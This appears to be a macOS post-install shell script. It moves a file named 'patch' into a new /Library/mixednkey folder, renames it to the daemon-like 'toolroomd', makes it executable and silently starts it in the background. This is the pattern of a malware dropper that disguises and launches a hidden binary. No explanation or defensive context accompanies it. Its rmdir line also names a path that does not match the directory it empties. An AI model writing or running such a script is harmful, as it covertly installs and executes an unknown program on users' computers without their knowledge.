```
#!/bin/sh
mkdir /Library/mixednkey

mv /Applications/Utils/patch /Library/mixednkey/toolroomd
rmdir /Application/Utils

chmod +x /Library/mixednkey/toolroomd

/Library/mixednkey/toolroomd &
```
